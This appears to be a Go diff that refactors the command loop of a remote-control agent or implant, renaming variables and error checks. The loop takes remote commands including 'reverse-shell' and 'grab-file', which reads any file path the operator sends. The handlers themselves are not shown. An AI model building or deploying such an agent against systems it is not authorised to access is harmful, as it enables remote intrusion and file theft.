@@ -10,15 +10,14 @@ import (
 
 // CommandLoop is the loop that receives commands and executes them.
 // This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
-func CommandLoop(c comms.Connection) (err error) {
+func CommandLoop(cmdCon comms.Connection) (err error) {
 	for {
-		var messageBytes []byte
-		messageBytes, err = c.RecvBytes()
+		var message string
+		message, err = cmdCon.RecvString()
 		if err != nil {
 			break
 		}
 
-		message := string(messageBytes)
 		log.Printf("Recv: %s", message)
 
 		args := strings.Split(message, " ")
@@ -26,22 +25,22 @@ func CommandLoop(c comms.Connection) (err error) {
 
 		case "exit":
 			log.Println("Exiting")
-			_ = c.Close()
+			_ = cmdCon.Close()
 			os.Exit(0)
 
 		case "ping":
-			err = commands.PingReply(c)
+			err = commands.PingReply(cmdCon)
 
 		case "reverse-shell":
-			err = commands.ReverseShellReply(c)
+			err = commands.ReverseShellReply(cmdCon)
 
 		case "grab-file":
 			path := strings.Join(args[1:], " ")
-			err = commands.GrabFileReply(c, path)
+			err = commands.GrabFileReply(cmdCon, path)
 
 		}
 
-		if comms.IsConnectionError(err) {
+		if comms.IsNetworkError(err) {
 			break
 		}
 		if err != nil {
